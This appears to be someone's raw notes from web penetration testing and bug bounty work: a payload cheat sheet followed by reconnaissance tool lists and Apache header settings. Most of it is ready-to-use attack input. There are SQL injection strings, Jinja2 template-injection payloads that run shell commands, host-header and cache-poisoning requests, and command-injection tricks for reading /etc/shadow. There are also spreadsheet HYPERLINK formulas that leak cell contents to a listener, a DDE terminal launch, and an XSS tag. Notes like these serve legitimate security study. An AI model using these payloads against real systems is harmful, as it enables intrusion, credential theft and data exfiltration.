                                                        category=fizzy'+%26%26+0+%26%26+'x
                                                        category=fizzy'+%26%26+1+%26%26+'x
                                                        category=fizzy%27%7c%7c%31%7c%7c%27

                        30.Graphql


                                                        /graphql
                                                        /api
                                                        /api/graphql
                                                        /graphql/api
                                                        /graphql/graphql
                                                        /v1


                        31. SSTI 


                                                        if <z> present XSS
                                                        if <z> not present SSTI

                                                        <%=foobar%>
                                                        {{7*'7'}}

                                                        Jinja2

                                                        RCE - {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
                                                              {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo%20 "some code"%20 > somefile2.py') }}
                                                        {% for c in [1,2,3] %}{{ c,c,c }}{% endfor %}
                                                        {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
                                                        {{ ''.__class__.mro()[1].__subclasses__() }}
                                                        {{ ''.__class__.__mro__[1].__subclasses__() }}
                                                        {{ cycler.__init__.__globals__.os.popen('id').read() }}
                                                        {{ joiner.__init__.__globals__.os.popen('id').read() }}
                                                        {{ [].__class__.__base__.__subclasses__() }}
                                                        {{ namespace.__init__.__globals__.os.popen('id').read() }}
                                                        {{ lipsum.__globals__["os"].popen('id').read() }}

                                                        NODE JS

                                                        {{ this }}  -> [Object Object]
                                                        {{ this.__proto__ }} --> [Object Object]
                                                        {{ this.__proto__.constructor.name }} --> Object



                                                        try second order 


                        32. Web Cache Poisoning 


                                                        Try to manipulate unkeyed inputs like headers 
                                                        Use paraminer 
                                                        Cachebuster 

                                                        X-Forwarded-Host: innocent-website.co.uk
                                                        X-Forwarded-Host: a."><script>alert(1)</script>"

                                                        check for cache headers in response X-Cache:



                        33. Host Header Injection


                                                        Host: vulnerable-website.com
                                                        Host: bad-stuff-here

                                                        GET https://vulnerable-website.com/ HTTP/1.1
                                                        Host: bad-stuff-here


                                                        GET /example HTTP/1.1
                                                            Host: bad-stuff-here
                                                        Host: vulnerable-website.com



                                                        X-Host
                                                        X-Forwarded-Server
                                                        X-HTTP-Host-Override
                                                        Forwarded


                                                        if 403 
                                                        Host : localhost 



                                                        password reset poisoning 

                         34. LFI


                                                        ../../../../../



                          35. RCE

                                                    GET /calculator?calc="__import__('os').system('ls')"
                                                    sleep
                                                    username
                                                    
                                                    
                                                    bypass
                                                    
                                                    cat /etc/shadow
                                                    cat "/e"tc'/shadow'
                                                    cat /etc/sh*dow
                                                    cat /etc/sha``dow
                                                    cat /etc/sha$()dow
                                                    cat /etc/sha${}dow
                                                    
                                                    refer vikile



                                        Bug bounty hunder methodology - Jason Haddix




Finding root




Aquisition - crunchbase.com


ASN - bgp.he.net


Amass - Run Against ASN - to get seed domains


builtwith.com - relationship status gives you other domains

copyright text - copy and google - to get subdomains

Shodan - more great stuff



                                 



Finding subdomain



Burp pro - target -> scope -> office --> feed all to spider   / searh .js

burp js link finder





software vul scanner - burp ext


hackcrawler







subdomain scraping



amass / subfinder


hunter3.sh - json



jsmon & scripthunter

httprobe - checks live apps


interlace - codingo


tomnomnom , condingo , hackluke, nahmsec lazy recon , 


content discovery - 


https://www.yougetsignal.com/tools/web-sites-on-web-server/
https://certspotter.com/api/v0/certs?domain=ford.com
https://medium.com/bugbountywriteup
https://pentester.land/
https://bugbountyforum.com/tools/recon/

crawl spider check all pages


masscan - port scan

service scan 

anew

login bruteforce - brutespray 


nuclei


ffuf



wordlist - seclists





 










                                                        SSL VS TLS 


                                                        SSL1
                                                        SSL2
                                                        SSL3 TLS 1.O
                                                             TLS 1.1
                                                             TLS 1.2
                                                             TLS 1.3



                                                                sudo fuser -k 5000/tcp
                                                                python3 app.py 5000 
                                                                systemctl restart apache2
                                                                systemctl reload apache2
                                                                udo lsof -nP -iTCP -sTCP:LISTEN
                                                                visual block - ctrl +v
                                                                shift+I = insert
                                                                d = delete
                                                                x = delete





https://cdn.acunetix.com/wp-content/uploads/2022/01/11175019/scan-report-testphp.vulnweb.com-owasptopten2021-27_08_2021-12_05-PM.html#PhpUseOnlyCookiesIsDisabled


HYPERLINK("http://127.0.0.1:9000?leak="&A4,"POC")


=HYPERLINK("http://127.0.0.1:9008?leak="&A10,"POC")


='file:///etc/passwd'#$passwd.A1

"bank":"=HYPERLINK(\"http://127.0.0.1:9000?leak=\"&A04&\",\"POC\")",


=HYPERLINK("http:///etc/passwd","app")


=HYPERLINK(CONCATENATE(\"http://127.0.0.1:9000/\",(\'file:///etc/passwd\')))



=HYPERLINK("https://GOOGLE.COM","google")

HYPERLINK("http://127.0.0.1:9000?send="&I9,"POC")

="=cmd|' /C open -a Terminal'!A0"



 1. Discuss about CORS + email bypass
 2. discuss basic authentication vs form based authentication
 3. XSS + Contexts
 4. SSTI 
 5.    Header set content-Security-Policy "default-src 'self' *.medium.com; script-src 'self' 'unsafe-inline'; frame-ancestors 'None'"
       Header set Strict-Transport-Security: "max-age=6400; includeSubDomain;"
       Header set X-Frame-Options "DENY"
       Header set Access-Control-Allow-Origin 'tcs.com'
       Header set Access-Control-Allow-Credentials "true"

 6. header always set
 7. Samesite
       





<IfModule mod_headers.c>

        Header set content-Security-Policy "default-src 'self' *.medium.com *.test; script-src '14.rs' 'unsafe-inline';" frame-ancestors 'None'"

        Header set Strict-Transport-Security: "max-age=6400; includeSubDomain;"
#       Header set X-Frame-Options "DENY"x
#       SetEnvIf Origin "^(.*)$" ORIGIN_DOMAIN=$1
        Header set Access-Control-Allow-Origin test.com
        Header set Access-Control-Allow-Credentials "true"

</IfModule>


Team connect - Security Engineering from developer perspective 


<marquee/onstart=prompt()>





                                                        


















